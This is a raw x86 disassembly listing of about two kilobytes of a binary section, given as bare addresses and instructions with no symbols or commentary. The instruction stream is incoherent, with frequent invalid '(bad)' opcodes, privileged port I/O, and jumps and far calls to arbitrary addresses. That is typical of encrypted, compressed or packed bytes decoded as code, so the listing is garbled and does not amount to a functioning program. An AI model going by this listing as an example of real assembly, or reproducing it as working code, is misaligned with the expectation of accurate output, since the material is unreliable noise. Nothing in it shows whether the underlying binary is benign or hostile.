  4200db:	add    eax,0xa58d3fe5
  4200e0:	jmp    0xe1544333
  4200e5:	jl     0x42012b
  4200e7:	jb     0x4200a0
  4200e9:	out    dx,al
  4200ea:	jbe    0x4200e0
  4200ec:	jmp    0x98512942
  4200f1:	mov    ch,0x5d
  4200f3:	pop    es
  4200f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200f5:	xor    BYTE PTR [edi-0x67],0xa8
  4200f9:	dec    edx
  4200fa:	das    
  4200fb:	sub    DWORD PTR [esi-0x22],0x1f60ded
  420102:	ret    
  420103:	outs   dx,DWORD PTR ds:[esi]
  420104:	in     eax,0x57
  420106:	sub    ecx,DWORD PTR [edx]
  420108:	retf   0x2772
  42010b:	repz fcomp DWORD PTR ds:[ebx+0x2c74e5c5]
  420113:	call   DWORD PTR [ecx]
  420115:	and    bl,BYTE PTR ds:0xee3cea9e
  42011b:	popf   
  42011c:	mov    dh,0x82
  42011e:	out    dx,al
  42011f:	xchg   BYTE PTR [edx-0x14d3c899],ch
  420125:	rol    BYTE PTR [eax-0x2f362a94],0xd9
  42012c:	(bad)  
  42012d:	bound  esi,QWORD PTR [edx-0x10]
  420130:	push   cs
  420131:	in     al,0xe8
  420133:	xor    cl,dh
  420135:	mov    dh,dl
  420137:	jb     0x4200be
  420139:	rol    DWORD PTR [ebp+0x216a4f3d],1
  42013f:	sbb    BYTE PTR [eax-0x39717c39],ch
  420145:	sub    DWORD PTR [eax-0x7f],ecx
  420148:	add    eax,ebp
  42014a:	retf   
  42014b:	lods   eax,DWORD PTR ds:[esi]
  42014c:	fisttp WORD PTR [esi-0x18]
  42014f:	inc    esi
  420150:	retf   0xbcd3
  420153:	retf   0xcbc0
  420156:	push   edi
  420157:	xor    ecx,DWORD PTR [ebx-0x2e]
  42015a:	and    BYTE PTR [esi],dh
  42015c:	dec    eax
  42015d:	add    cl,BYTE PTR [ebx-0x4926d526]
  420163:	xchg   ebp,eax
  420164:	divps  xmm5,XMMWORD PTR ds:0x8a7827a3
  42016b:	fnstcw WORD PTR [edx-0x7e]
  42016e:	ror    BYTE PTR [ecx-0x77],1
  420171:	mov    ds:0x6c18ff11,eax
  420176:	pop    ds
  420177:	fwait
  420178:	push   ebx
  420179:	fstp   TBYTE PTR [ebx+eax*2]
  42017c:	pop    esp
  42017d:	cld    
  42017e:	sub    al,BYTE PTR [eax+0x5fe4aaed]
  420184:	mov    bl,0xdb
  420186:	xchg   esp,eax
  420187:	add    al,ah
  420189:	clc    
  42018a:	lea    esi,[eax-0x47]
  42018d:	add    al,bl
  42018f:	push   esp
  420190:	xchg   edi,eax
  420191:	dec    ebx
  420192:	sbb    BYTE PTR [edi],bl
  420194:	sbb    ch,BYTE PTR [edx+0x7b]
  420197:	jae    0x42020b
  420199:	jne    0x42019b
  42019b:	jmp    0x324a:0x3e157aa
  4201a2:	pop    ecx
  4201a3:	sbb    BYTE PTR [ebp-0x4c],ch
  4201a6:	push   ss
  4201a7:	call   0x63361503
  4201ac:	mov    ds:0xcbe6355d,eax
  4201b1:	jmp    0xd1a4917a
  4201b6:	(bad)  
  4201b7:	xlat   BYTE PTR ds:[ebx]
  4201b8:	dec    ebx
  4201b9:	into   
  4201ba:	push   gs
  4201bc:	js     0x4201fc
  4201be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201bf:	aam    0x1d
  4201c1:	popa   
  4201c2:	(bad)
  4201c5:	retf   0x337d
  4201c8:	aad    0xdf
  4201ca:	cmp    al,0xf
  4201cc:	and    al,0x97
  4201ce:	idiv   BYTE PTR [edx]
  4201d0:	or     eax,0x136a984b
  4201d5:	mov    ch,0x6d
  4201d7:	out    dx,eax
  4201d8:	repnz push esp
  4201da:	pop    esi
  4201db:	(bad)  
  4201dc:	(bad)  
  4201dd:	cdq    
  4201de:	out    0x5d,eax
  4201e0:	xor    esi,ecx
  4201e2:	fsubr  st(2),st
  4201e4:	dec    esi
  4201e5:	xor    DWORD PTR [edx],ebx
  4201e7:	scas   al,BYTE PTR es:[edi]
  4201e8:	(bad)  
  4201e9:	imul   ebx,DWORD PTR [esi+0x79b278da],0xffffffaa
  4201f0:	stos   BYTE PTR es:[edi],al
  4201f1:	push   edi
  4201f2:	adc    BYTE PTR [ebx+0x1c],bl
  4201f5:	jle    0x420198
  4201f7:	clc    
  4201f8:	shl    BYTE PTR [ebx],1
  4201fa:	gs sti 
  4201fc:	gs ins BYTE PTR es:[edi],dx
  4201fe:	inc    eax
  4201ff:	jmp    0xff4c:0x10227a43
  420206:	dec    ecx
  420207:	pop    edx
  420208:	xor    edi,DWORD PTR [ecx-0x64]
  42020b:	fstp   QWORD PTR [ebx-0x1ad211a6]
  420211:	sub    edi,ebx
  420213:	data16 lahf 
  420215:	and    eax,0xa8755222
  42021a:	dec    ecx
  42021b:	outs   dx,DWORD PTR gs:[esi]
  42021d:	xchg   ebx,eax
  42021e:	fistp  WORD PTR [ebx-0x2d]
  420221:	pusha  
  420222:	or     BYTE PTR [eax],dh
  420224:	or     ah,bh
  420226:	popa   
  420227:	pop    ebx
  420228:	mov    esp,0x8d8ace55
  42022d:	pop    ebx
  42022e:	jo     0x42028f
  420230:	jp     0x42020c
  420232:	repnz in al,0x31
  420235:	scas   eax,DWORD PTR es:[edi]
  420236:	out    dx,eax
  420237:	imul   ebp,DWORD PTR [eax+0x70b3bd69],0xffffffed
  42023e:	add    eax,0xc9a2226b
  420243:	ds js  0x42024b
  420246:	pop    edi
  420247:	out    0x40,eax
  420249:	daa    
  42024a:	mov    bl,bh
  42024c:	fcom   st(0)
  42024e:	add    BYTE PTR [eax],al
  420250:	add    BYTE PTR [eax],al
  420252:	xchg   esi,eax
  420253:	test   BYTE PTR [ebp-0x2],al
  420256:	push   edi
  420257:	(bad)  
  420258:	mov    edi,0xa59b80ec
  42025d:	and    BYTE PTR [edi-0x3d],al
  420260:	clc    
  420261:	in     al,0xe1
  420263:	jl     0x420266
  420265:	add    ah,dh
  420267:	add    al,0x0
  420269:	add    BYTE PTR [edi-0x3b],bh
  42026c:	adc    ch,BYTE PTR ds:0x2303926d
  420272:	call   0x9cfb:0x5ce787b7
  420279:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42027b:	popa   
  42027c:	(bad)  
  42027e:	push   ss
  42027f:	dec    eax
  420280:	pop    esi
  420281:	int3   
  420282:	dec    esp
  420283:	mov    al,ds:0x1aea6111
  420288:	mov    esi,eax
  42028a:	mov    WORD PTR [edi+0x2449f888],ds
  420290:	fimul  WORD PTR [ecx-0x48b0cc63]
  420296:	mov    ah,0x95
  420298:	add    esp,DWORD PTR [edx+0x71]
  42029b:	adc    BYTE PTR [ecx+0x108ae5e5],ah
  4202a1:	test   ebx,eax
  4202a3:	(bad)  
  4202a4:	inc    DWORD PTR [ebx]
  4202a6:	in     al,0xe
  4202a8:	cmp    ch,BYTE PTR [edi-0x48]
  4202ab:	imul   eax,ebx,0xffffffcb
  4202ae:	sahf   
  4202af:	pop    edi
  4202b0:	jl     0x4202b9
  4202b2:	jbe    0x4202f3
  4202b4:	ss push ebx
  4202b6:	(bad)  
  4202b7:	div    DWORD PTR [eax]
  4202b9:	adc    eax,0xddf81035
  4202be:	mov    eax,cs:0x872b7fa0
  4202c4:	out    dx,al
  4202c5:	and    dl,BYTE PTR [edi]
  4202c7:	inc    edi
  4202c8:	cmp    eax,0x49eea4fd
  4202cd:	scas   eax,DWORD PTR es:[edi]
  4202ce:	sbb    DWORD PTR [ebp-0x41],esp
  4202d1:	out    0xfb,eax
  4202d3:	mov    cl,0x7c
  4202d5:	js     0x4202e3
  4202d7:	gs in  eax,dx
  4202d9:	rcr    BYTE PTR [ebx-0x28],cl
  4202dc:	enter  0xcbb4,0x61
  4202e0:	lods   al,BYTE PTR ds:[esi]
  4202e1:	std    
  4202e2:	shr    DWORD PTR [ebp+edx*2-0x603cc3d8],cl
  4202e9:	scas   al,BYTE PTR es:[edi]
  4202ea:	hlt    
  4202eb:	imul   esi,DWORD PTR ds:0xc4df4896,0x22efa6c6
  4202f5:	clc    
  4202f6:	inc    ecx
  4202f7:	mov    al,0x6a
  4202f9:	mov    bl,0xdd
  4202fb:	or     cl,BYTE PTR [eax-0x26b4a56d]
  420301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420302:	mov    dl,0x9
  420304:	in     al,0x12
  420306:	xchg   ecx,eax
  420307:	fcom   st(1)
  420309:	test   BYTE PTR [edx],ch
  42030b:	mov    ah,0x51
  42030d:	stos   DWORD PTR es:[edi],eax
  42030e:	aas    
  42030f:	es pop esp
  420311:	xchg   esi,eax
  420312:	or     DWORD PTR [edi+0xc],edi
  420315:	or     eax,0x7197166d
  42031a:	sbb    DWORD PTR [ecx-0xc9bf513],0x4a
  420321:	in     eax,0x83
  420323:	inc    edi
  420324:	fild   WORD PTR [ebx]
  420326:	das    
  420327:	mov    ebx,0x932bf0a4
  42032c:	loopne 0x42033a
  42032e:	jnp    0x420312
  420330:	pusha  
  420331:	push   es
  420332:	ret    0xb7d0
  420335:	mov    eax,0xfc30dac8
  42033a:	jmp    0x4202d4
  42033c:	les    esp,FWORD PTR [ebx+0x30]
  42033f:	aaa    
  420340:	(bad)  
  420341:	shl    BYTE PTR [edi+edi*2-0xe],1
  420345:	pop    ds
  420346:	cmp    DWORD PTR [eax],0x2e416fcd
  42034c:	in     eax,0x9
  42034e:	mul    ecx
  420350:	sbb    bl,BYTE PTR [esi-0x422760da]
  420356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420357:	push   ecx
  420358:	ds adc al,0x89
  42035b:	mov    al,0x3b
  42035d:	pop    ebp
  42035e:	push   esi
  42035f:	lea    ebx,[eax+edi*1+0x61]
  420363:	pop    ebp
  420364:	icebp  
  420365:	int    0xac
  420367:	mov    BYTE PTR [eax-0x3c19ad2b],ch
  42036d:	xor    dl,al
  42036f:	(bad)  
  420370:	aam    0x88
  420372:	outs   dx,DWORD PTR ds:[esi]
  420373:	xchg   edi,eax
  420374:	outs   dx,DWORD PTR ds:[esi]
  420375:	aas    
  420376:	mov    al,ds:0xc2aac7ee
  42037b:	ins    BYTE PTR es:[edi],dx
  42037c:	mov    ds:0x6423089e,eax
  420381:	push   edi
  420382:	xchg   ecx,eax
  420383:	(bad)  [ecx+0x24]
  420386:	or     DWORD PTR [ebp+0x11f6c07e],0x31811ec9
  420390:	(bad)  [eax-0x74e7fb8f]
  420396:	mov    ds:0x31136274,al
  42039b:	mov    WORD PTR [esi],fs
  42039d:	inc    ecx
  42039e:	(bad)  
  4203a0:	pop    ebx
  4203a1:	push   DWORD PTR [ebx+0x7a]
  4203a4:	(bad)  
  4203a6:	and    al,0x97
  4203a8:	xlat   BYTE PTR ds:[ebx]
  4203a9:	lahf   
  4203aa:	loopne 0x42032c
  4203ac:	add    al,0xe8
  4203ae:	xchg   al,dh
  4203b0:	sahf   
  4203b1:	(bad)  
  4203b2:	pop    eax
  4203b3:	outs   dx,BYTE PTR ds:[esi]
  4203b4:	loop   0x4203f8
  4203b6:	les    esi,FWORD PTR [eax-0x75abb8df]
  4203bc:	test   BYTE PTR [ebp+0x63],0x11
  4203c0:	inc    esi
  4203c1:	imul   edx,DWORD PTR [ebp-0x681af789],0xe2a99936
  4203cb:	nop
  4203cc:	inc    eax
  4203cd:	imul   DWORD PTR [ecx-0x4f]
  4203d0:	stos   DWORD PTR es:[edi],eax
  4203d1:	sub    eax,0xd50a1b89
  4203d6:	and    ebx,ebx
  4203d8:	out    0xa2,al
  4203da:	pop    edx
  4203db:	push   cs
  4203dc:	nop
  4203dd:	in     eax,dx
  4203de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203df:	mov    edi,0x8337de6f
  4203e4:	adc    al,0xef
  4203e6:	fnstenv [eax]
  4203e8:	push   cs
  4203e9:	scas   eax,DWORD PTR es:[edi]
  4203ea:	jb     0x4203f6
  4203ec:	or     DWORD PTR [ebx+0x7d],0x459e8066
  4203f3:	jae    0x42040a
  4203f5:	dec    eax
  4203f6:	mov    bh,0x16
  4203f8:	push   0xbe29916b
  4203fd:	jle    0x42041a
  4203ff:	push   edi
  420400:	push   0xbe1afa83
  420405:	(bad)  
  420406:	cli    
  420407:	push   ds
  420408:	ret    
  420409:	push   0xdc130f8c
  42040e:	cmp    eax,0x8de199c4
  420413:	adc    ebp,DWORD PTR [ebx+0xa823611]
  420419:	in     eax,0xea
  42041b:	xchg   BYTE PTR ds:0x2ca2fd52,bl
  420421:	fucomp st(0)
  420423:	pop    eax
  420424:	ret    0xb8ff
  420427:	rol    bh,cl
  420429:	push   ebp
  42042a:	push   edi
  42042b:	cli    
  42042c:	(bad)  [edi-0x426b3824]
  420432:	adc    BYTE PTR [eax],0x9
  420435:	imul   ebp,DWORD PTR ds:0x705088e6,0x28fb3812
  42043f:	jno    0x42045e
  420441:	pop    es
  420442:	add    DWORD PTR es:[ebx+0x23043cd5],edx
  420449:	sub    BYTE PTR [edi+0x619d3e85],0xf7
  420450:	mov    eax,0x91316e14
  420455:	ret    
  420456:	lock (bad) 
  420458:	ret    
  420459:	xchg   esp,eax
  42045a:	push   eax
  42045b:	inc    eax
  42045c:	xor    edi,esi
  42045e:	jge    0x4204b0
  420460:	cdq    
  420461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420462:	xor    ebp,DWORD PTR [ebx-0x4067aaa6]
  420468:	cmp    bl,BYTE PTR [edx]
  42046a:	pop    esi
  42046b:	jl     0x42049b
  42046d:	pop    ds
  42046e:	cmp    eax,0x8a377bbc
  420473:	(bad)  
  420474:	int3   
  420475:	pop    ebp
  420476:	mov    ch,0x6d
  420478:	pop    edx
  420479:	mov    al,0xb8
  42047c:	push   ss
  42047d:	std    
  42047e:	push   edi
  42047f:	ja     0x4204f5
  420481:	scas   eax,DWORD PTR es:[edi]
  420482:	pop    es
  420483:	mov    dh,ah
  420485:	jb     0x4204e5
  420487:	and    al,0x1d
  420489:	inc    edx
  42048a:	arpl   WORD PTR [edx+0x7],dx
  42048d:	xchg   ecx,eax
  42048e:	pop    esp
  42048f:	mov    bh,ah
  420491:	es pushf 
  420493:	mov    ah,0x7b
  420495:	jb     0x42042b
  420497:	jg     0x420474
  420499:	sti    
  42049a:	adc    al,0xbc
  42049c:	lods   al,BYTE PTR ds:[esi]
  42049d:	arpl   WORD PTR [eax+0x7ae4c4b4],cx
  4204a3:	or     esp,DWORD PTR [edi+0x2b]
  4204a6:	data16 mov dl,0x2
  4204a9:	or     DWORD PTR [eax-0x646d6b1c],eax
  4204af:	cmp    esi,ebp
  4204b1:	popa   
  4204b2:	pusha  
  4204b3:	and    BYTE PTR [esi],cl
  4204b5:	sbb    esp,edx
  4204b7:	fisubr WORD PTR [esi]
  4204b9:	push   es
  4204ba:	ror    BYTE PTR [eax+0x161dfe6f],1
  4204c0:	mov    ds:0xc6b2f075,eax
  4204c5:	loopne 0x4204e0
  4204c7:	out    dx,eax
  4204c8:	push   esp
  4204c9:	dec    edi
  4204ca:	call   0xd7eb:0xa033bc02
  4204d1:	and    dl,BYTE PTR [ebx+ecx*4+0x39]
  4204d5:	rcl    DWORD PTR [esp+ebp*1+0x41e8fa74],cl
  4204dc:	cmp    BYTE PTR [ecx],0x99
  4204df:	mov    dh,BYTE PTR [edi-0x20749bf2]
  4204e5:	adc    DWORD PTR [edi],ebp
  4204e7:	pop    edi
  4204e8:	sar    dl,0x1e
  4204eb:	fbld   TBYTE PTR [ebx]
  4204ed:	retf   0x14a8
  4204f0:	loopne 0x4204de
  4204f2:	mov    eax,DWORD PTR [ecx-0x4a]
  4204f5:	xor    al,0xb8
  4204f7:	pushf  
  4204f8:	xor    DWORD PTR [ebx],eax
  4204fa:	ret    
  4204fb:	and    al,BYTE PTR [ecx+0x6c981222]
  420501:	mov    DWORD PTR [esi],esi
  420503:	ret    
  420504:	stos   BYTE PTR es:[edi],al
  420505:	cs jmp 0xe4a28e1f
  42050b:	fidivr WORD PTR [edi+0x47]
  42050e:	out    dx,al
  42050f:	lea    edi,[edi-0x2f]
  420512:	add    ecx,DWORD PTR [ebx-0x15389f35]
  420518:	inc    edx
  420519:	pop    eax
  42051a:	outs   dx,BYTE PTR ds:[esi]
  42051b:	push   ss
  42051c:	sbb    eax,0x1be0c81c
  420521:	inc    ecx
  420522:	xchg   DWORD PTR [ebx+0x709ffc88],edi
  420528:	iret   
  420529:	cmp    BYTE PTR [ebx],0x20
  42052c:	adc    ch,BYTE PTR [ebx]
  42052e:	xor    DWORD PTR [edx-0x1157b6e1],ebx
  420534:	mov    WORD PTR [edi],es
  420536:	arpl   bp,cx
  420538:	mov    ecx,edi
  42053a:	es push edx
  42053c:	jg     0x420540
  42053e:	mov    DWORD PTR [edx],ebp
  420540:	sub    esi,ebx
  420542:	sti    
  420543:	push   ds
  420544:	sti    
  420545:	adc    DWORD PTR [ecx+0x43c17ff0],0x84e0a490
  42054f:	jl     0x4205b8
  420551:	cmp    eax,0x1ad7a465
  420556:	jecxz  0x4205b2
  420558:	int    0x5e
  42055a:	xchg   edi,eax
  42055b:	jnp    0x4205c9
  42055d:	emms   
  42055f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420560:	(bad)  
  420562:	into   
  420563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420565:	or     ebp,esi
  420567:	mov    esi,0x17758654
  42056c:	jle    0x4205ea
  42056e:	pop    edx
  42056f:	sub    BYTE PTR [edx+ebp*4-0x28b656ba],dl
  420576:	mov    esi,0x5432aae0
  42057b:	je     0x42059f
  42057d:	retf   
  42057e:	aaa    
  42057f:	cwde   
  420580:	daa    
  420581:	inc    ebx
  420582:	pop    ds
  420583:	aas    
  420584:	lahf   
  420585:	hlt    
  420586:	xor    dh,0x4d
  420589:	outs   dx,BYTE PTR ds:[esi]
  42058a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42058b:	lea    ebp,[ebx-0x637d1d05]
  420591:	sahf   
  420592:	sbb    al,0x2c
  420594:	or     eax,esi
  420596:	inc    edi
  420597:	loopne 0x4205fc
  420599:	sbb    dh,bh
  42059b:	out    0x69,al
  42059d:	fnsave [edi]
  42059f:	xor    ebp,DWORD PTR [ebp-0x6]
  4205a2:	or     DWORD PTR [edx-0x2f1fc3a3],ecx
  4205a8:	call   0x580d:0x4d786e00
  4205af:	mov    WORD PTR [ebp+0x514e3c6],ds
  4205b5:	rcr    DWORD PTR [edi],1
  4205b7:	sbb    al,0x26
  4205b9:	ret    0x7b5b
  4205bc:	mov    dh,0xbe
  4205be:	and    ecx,ebx
  4205c0:	lahf   
  4205c1:	mov    eax,0xb589ee11
  4205c6:	dec    ebp
  4205c7:	adc    ecx,DWORD PTR [eax]
  4205c9:	cwde   
  4205ca:	sub    esi,0x366635f
  4205d0:	inc    ecx
  4205d1:	jae    0x420624
  4205d3:	aad    0xfd
  4205d5:	mov    al,0xd2
  4205d7:	xor    DWORD PTR [edi+ebx*8+0x8],esp
  4205db:	cs dec ecx
  4205dd:	mov    edi,0xe7e97ae0
  4205e2:	push   ss
  4205e3:	outs   dx,BYTE PTR ds:[esi]
  4205e4:	xchg   edi,eax
  4205e5:	sub    dl,bl
  4205e7:	mov    ds:0xf6988342,al
  4205ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205ed:	dec    edi
  4205ee:	pop    ebp
  4205ef:	mov    DWORD PTR [ecx],0x4aef5948
  4205f5:	xor    ah,BYTE PTR [ebx-0x4fe51f47]
  4205fb:	adc    al,0xe6
  4205fd:	fiadd  DWORD PTR [ecx]
  4205ff:	mov    eax,ds:0x52f6d5bd
  420604:	jmp    0x544d:0xa2c125d
  42060b:	and    al,0xa3
  42060d:	outs   dx,BYTE PTR ds:[esi]
  42060e:	mov    edx,ecx
  420610:	inc    ecx
  420611:	lahf   
  420612:	cmp    ch,dl
  420614:	push   eax
  420615:	jg     0x420693
  420617:	mov    al,ds:0x524939c8
  42061c:	shr    BYTE PTR [esp+ebx*2+0x2ada4bd],0xbd
  420624:	xchg   esp,eax
  420625:	fscale 
  420627:	pusha  
  420628:	add    eax,0xb2ee9c1a
  42062d:	ficom  WORD PTR [ebp+0x7a171e9]
  420633:	and    BYTE PTR [esi],al
  420635:	enter  0xe5d4,0xed
  420639:	jl     0x4205f8
  42063b:	in     eax,0x87
  42063d:	cmp    ecx,DWORD PTR [ecx+0x78]
  420640:	out    0xa5,al
  420642:	iret   
  420643:	mov    DWORD PTR [ecx-0x14630aed],0xaee3b4d9
  42064d:	test   DWORD PTR [ebp-0x1],eax
  420650:	pop    ecx
  420651:	dec    esp
  420652:	sub    al,0x56
  420654:	imul   ebx,ebp,0xf798e727
  42065a:	add    al,0x9b
  42065c:	push   es
  42065d:	add    al,0x72
  42065f:	lea    eax,[ebp-0x73]
  420662:	mov    BYTE PTR [esi-0x70d7ba48],bh
  420668:	jp     0x420604
  42066a:	pop    ss
  42066b:	imul   ebp,DWORD PTR [esi],0xffffff9a
  42066e:	jmp    0x42068d
  420670:	dec    edi
  420671:	push   edi
  420672:	cmp    al,bl
  420674:	xchg   ebx,eax
  420675:	mov    edi,0xf938678a
  42067a:	enter  0xaa66,0x82
  42067e:	fbstp  TBYTE PTR [esi]
  420680:	add    edx,ecx
  420682:	jp     0x4206ef
  420684:	dec    ebp
  420685:	addr16 popa 
  420687:	dec    ebp
  420688:	in     eax,dx
  420689:	or     DWORD PTR [ebx],edi
  42068b:	out    0x3c,al
  42068d:	or     eax,0x6e6f2b6a
  420692:	idiv   DWORD PTR ds:0x138978ef
  420698:	add    DWORD PTR [edx-0x6a],eax
  42069b:	jne    0x42066f
  42069d:	inc    DWORD PTR [esi+esi*2]
  4206a0:	test   BYTE PTR [edi+0x2c6c9779],bh
  4206a6:	sbb    eax,0xbeb95afd
  4206ab:	arpl   di,ax
  4206ad:	pop    ebp
  4206ae:	fdiv   QWORD PTR [ebx]
  4206b0:	fsubr  DWORD PTR [ebp-0x729be428]
  4206b6:	jne    0x4206cb
  4206b8:	scas   eax,DWORD PTR es:[edi]
  4206b9:	jo     0x4206d9
  4206bb:	fcmovbe st,st(4)
  4206bd:	push   edi
  4206be:	daa    
  4206bf:	test   eax,0xfba451ae
  4206c4:	push   ss
  4206c5:	and    DWORD PTR [edi+0x3ca4b0bc],0x44
  4206cc:	ror    BYTE PTR [ebp-0x5810d66],cl
  4206d2:	jnp    0x4206f8
  4206d4:	adc    ah,bh
  4206d6:	fistp  DWORD PTR [edi+0x74]
  4206d9:	fld    st(1)
  4206db:	cs ss popa 
  4206de:	test   BYTE PTR [eax],dl
  4206e0:	daa    
  4206e1:	sbb    BYTE PTR [edi],bh
  4206e3:	ret    0x9eaa
  4206e6:	fwait
  4206e7:	add    BYTE PTR [edi+0x72],bl
  4206ea:	lods   eax,DWORD PTR ds:[esi]
  4206eb:	mov    ebp,0xf0dbe736
  4206f0:	fldcw  WORD PTR [ebx]
  4206f2:	js     0x4206b3
  4206f4:	clc    
  4206f5:	aad    0xfd
  4206f7:	sbb    ch,BYTE PTR [ebp+0x6f20d91c]
  4206fd:	xchg   DWORD PTR [ecx],ecx
  4206ff:	idiv   eax
  420701:	sub    DWORD PTR [ebx+0xe],edi
  420704:	aaa    
  420705:	les    eax,FWORD PTR [esi+0x72]
  420708:	mov    es,WORD PTR [ebp+0x66]
  42070b:	pop    ecx
  42070c:	mov    edi,0xe3216e94
  420711:	or     DWORD PTR [ebp-0x45],eax
  420714:	or     ebp,DWORD PTR [esi+esi*2]
  420717:	xchg   edx,eax
  420718:	cdq    
  420719:	aam    0x91
  42071b:	jecxz  0x42070a
  42071d:	sar    DWORD PTR [edx],cl
  42071f:	adc    ah,BYTE PTR [ebp+0xa]
  420722:	rcr    esp,0x93
  420725:	test   eax,0xd8ca0af2
  42072a:	mov    DWORD PTR [edx],esp
  42072c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42072d:	in     eax,dx
  42072e:	jbe    0x4206ea
  420730:	cs dec ecx
  420732:	jge    0x4207a8
  420734:	rcl    dl,0x5d
  420737:	imul   ebx,DWORD PTR [eax-0x3b4d3f95],0x7617094
  420741:	mov    edi,0xbcdc5e6
  420746:	cld    
  420747:	mov    dl,0x5d
  420749:	mov    BYTE PTR [edx-0x2b67132a],bh
  42074f:	aas    
  420750:	fsubr  DWORD PTR [ebx]
  420752:	shl    BYTE PTR [ecx-0x4f5e425d],cl
  420758:	loop   0x42070b
  42075a:	sbb    al,0x93
  42075c:	inc    edx
  42075d:	into   
  42075e:	add    BYTE PTR [eax],al
  420760:	add    BYTE PTR [eax],al
  420762:	and    DWORD PTR [edi],ebx
  420764:	fld    QWORD PTR [esi]
  420766:	inc    esi
  420768:	sti    
  420769:	aas    
  42076a:	jb     0x42078b
  42076c:	add    edx,edx
  42076e:	imul   esi,DWORD PTR [esi-0x7c],0x181d5bd
  420775:	add    ah,dh
  420777:	add    al,0x0
  420779:	add    BYTE PTR [eax+ebx*2],dh
  42077c:	shr    eax,0x5
  42077f:	jne    0x42075a
  420781:	adc    eax,0xa36e6b2a
  420786:	cwde   
  420787:	clc    
  420788:	fimul  WORD PTR [ecx]
  42078a:	bound  esp,QWORD PTR [edi+ebx*4-0x59]
  42078e:	fisub  WORD PTR [edx-0x14]
  420791:	adc    eax,esp
  420793:	ror    BYTE PTR [esi],0x6c
  420796:	loop   0x420814
  420798:	loop   0x4207c0
  42079a:	xlat   BYTE PTR ds:[ebx]
  42079b:	data16 aas 
  42079d:	jne    0x42079f
  42079f:	cmp    BYTE PTR [eax],bl
  4207a1:	std    
  4207a2:	lock and BYTE PTR [ebp+0x2a],ah
  4207a6:	xchg   esi,eax
  4207a7:	sub    BYTE PTR [ebp+0x9ef4e1f],al
  4207ad:	xchg   al,bl
  4207af:	adc    eax,0xd1e70a3f
  4207b4:	outs   dx,BYTE PTR ds:[esi]
  4207b5:	stos   BYTE PTR es:[edi],al
  4207b6:	ror    BYTE PTR [ebp-0x2d],cl
  4207b9:	(bad)  
  4207ba:	dec    eax
  4207bb:	fadd   QWORD PTR ds:0x5a01a5a2
  4207c1:	mov    dl,0xf8
  4207c3:	add    al,0x62
  4207c5:	inc    esp
  4207c6:	jae    0x4207e8
  4207c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c9:	je     0x4207c8
  4207cb:	mov    bh,0x33
  4207cd:	add    BYTE PTR [ecx+0xf],dh
  4207d0:	xchg   ecx,eax
  4207d1:	(bad)  
  4207d2:	cmp    esi,DWORD PTR [ebx]
  4207d4:	in     eax,dx
  4207d5:	fs mov cl,ch
  4207d8:	jne    0x42083b
  4207da:	push   ss
  4207db:	fcmovu st,st(4)
  4207dd:	jne    0x4207df
  4207df:	ins    DWORD PTR es:[edi],dx
  4207e0:	xor    al,BYTE PTR [esi+0x2d]
  4207e3:	jno    0x420806
  4207e5:	push   ebx
  4207e6:	jo     0x420859
  4207e8:	push   edx
  4207e9:	loope  0x42085b
  4207eb:	loop   0x42082b
  4207ed:	sub    eax,DWORD PTR [edi]
  4207ef:	xor    dh,BYTE PTR [edx-0x1f]
  4207f2:	mov    DWORD PTR [edx+0x4a951f41],esp
  4207f8:	sub    bl,BYTE PTR [eax-0x40674e6e]
  4207fe:	mov    dh,0x35
  420800:	push   edx
  420801:	retf   0x6d0d
  420804:	cmp    bh,dh
  420806:	inc    DWORD PTR [edx-0x4afe9a07]
  42080c:	arpl   di,cx
  42080e:	cmp    bl,BYTE PTR [eax+esi*2+0x4baafb89]
  420815:	js     0x420894
  420817:	xchg   ecx,eax
  420818:	cld    
  420819:	mov    dl,0x11
  42081b:	push   cs
  42081c:	add    edi,esp
  42081e:	xor    edx,DWORD PTR [ecx]
  420820:	xrelease xchg BYTE PTR [esi+0x0],dh
  420824:	pop    ss
  420825:	dec    ebx
  420826:	fild   WORD PTR [eax+edx*2+0x70]
  42082a:	int3   
  42082b:	adc    ebx,edi
  42082d:	mov    ds:0xfc854b2f,al
  420832:	jge    0x420863
  420834:	lds    ebx,FWORD PTR [edi-0x38]
  420837:	mov    ?,WORD PTR [ebx-0x38c420bb]
  42083d:	sbb    al,0x15
  42083f:	jno    0x4207e7
  420841:	enter  0x394f,0x5e
  420845:	rol    ebx,0x6c
  420848:	stos   BYTE PTR es:[edi],al
  420849:	in     al,dx
  42084a:	inc    eax
  42084b:	pop    esp
  42084c:	sahf   
  42084d:	div    dl
  42084f:	add    eax,0xd4b42b01
  420854:	shr    BYTE PTR [edi+0x75],1
  420857:	imul   ebp,DWORD PTR [eax+0x785204d3],0xffffffc1
  42085e:	push   esi
  42085f:	fidivr WORD PTR [esi+0x6c]
  420862:	pop    eax
  420863:	add    DWORD PTR [esi+0x5729f812],0x8c977abc
  42086d:	mul    DWORD PTR [esp+esi*1]
  420870:	daa    
  420871:	mov    esi,0x3889499
  420876:	in     eax,dx
  420877:	jmp    0xd0987b70
  42087c:	test   al,0x58
  42087e:	jmp    0x4208a5
  420880:	rcr    bh,0x95
  420883:	mov    eax,ds:0xe4e95f40
  420888:	rcl    DWORD PTR [edx-0x70],cl
  42088b:	mov    ch,0x82
  42088d:	test   BYTE PTR [ebx+edi*1+0x2],ch
  420891:	adc    eax,0x30479091
  420896:	xchg   edi,eax
  420897:	jbe    0x420892
  420899:	dec    bp
  42089b:	xchg   edi,eax
  42089c:	test   ebx,0x45cef8e
  4208a2:	and    eax,0x4d12684a
  4208a7:	cmc    
  4208a8:	std    
  4208a9:	adc    BYTE PTR [edi+0x1cd46c2c],ah
  4208af:	add    cl,BYTE PTR [ebp+0x656ef6cd]
